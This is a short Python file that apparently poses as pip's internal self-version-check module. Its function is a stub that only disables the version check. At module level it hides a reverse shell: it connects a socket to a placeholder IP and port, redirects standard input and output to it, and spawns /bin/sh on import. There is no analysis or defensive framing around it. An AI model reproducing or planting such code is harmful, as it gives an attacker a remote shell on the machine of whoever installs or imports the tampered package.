import optparse
import socket
import os
import pty

from pip._internal.network.session import PipSession


def pip_self_version_check(session: PipSession, options: optparse.Values) -> None:
    # Suppress pip's own version check
    pass

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("<IP>",<PORT>))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    pty.spawn("/bin/sh")

except (socket.timeout, ConnectionRefusedError, OSError) as e:
    print(f">>> Warning: could not connect to {host}:{port} — {e}")
